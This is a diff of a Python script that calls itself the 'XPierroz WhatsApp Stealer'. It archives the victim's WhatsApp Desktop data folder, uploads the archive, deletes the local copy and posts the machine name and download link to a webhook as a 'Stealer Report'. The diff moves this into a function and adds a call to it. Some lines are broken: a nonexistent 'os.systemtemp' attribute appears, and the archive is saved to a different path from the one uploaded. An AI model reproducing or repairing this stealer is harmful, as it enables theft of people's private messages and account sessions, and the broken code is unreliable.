@@ -3,8 +3,10 @@ import os, requests, time, socket, shutil
 # PSG > OM
 
 WEBHOOK = "xpierroz and darknosy on top"
+
+temp = os.getenv("TEMP")
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
-print(direct)
+live = "temp"
 
 def upload(path):
     for x in range(10):
@@ -20,26 +22,31 @@ def upload(path):
             time.sleep(2)
     return False
 
-try:
-    shutil.make_archive("ssouput", "zip", direct)
-except Exception: 
-    pass
+def l_om_est_eclate():
+    try:
+        os.systemtemp
+        #shutil.make_archive("ssouput", "zip", direct)
+        shutil.make_archive(os.path.join(live, "ssoutput"), "zip", direct)
+    except Exception:
+        pass
+    
+    m = upload(f"{os.getcwd()}\\ssouput.zip")
+    os.remove(f"{os.getcwd()}\\ssouput.zip")
+    
+    message = f"**XPierroz WhatsApp Stealer Report**\n\n"
+    message += f"🖥️ Pc: {socket.gethostname()}\n"
+    message += f"📎 Url: {m}"
+    
+    payload = {
+        "content": message,
+        "username": "XPierroz WhatsApp Stealer",
+        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
+    }
+    
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    requests.post(WEBHOOK, json=payload, headers=headers)
 
-m = upload(f"{os.getcwd()}\\ssouput.zip")
-os.remove(f"{os.getcwd()}\\ssouput.zip")
-
-message = f"**XPierroz WhatsApp Stealer Report**\n\n"
-message += f"🖥️ Pc: {socket.gethostname()}\n"
-message += f"📎 Url: {m}"
-
-payload = {
-    "content": message,
-    "username": "XPierroz WhatsApp Stealer",
-    "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
-}
-
-headers = {
-    "Content-Type": "application/json"
-}
-
-requests.post(WEBHOOK, json=payload, headers=headers)
+l_om_est_eclate()
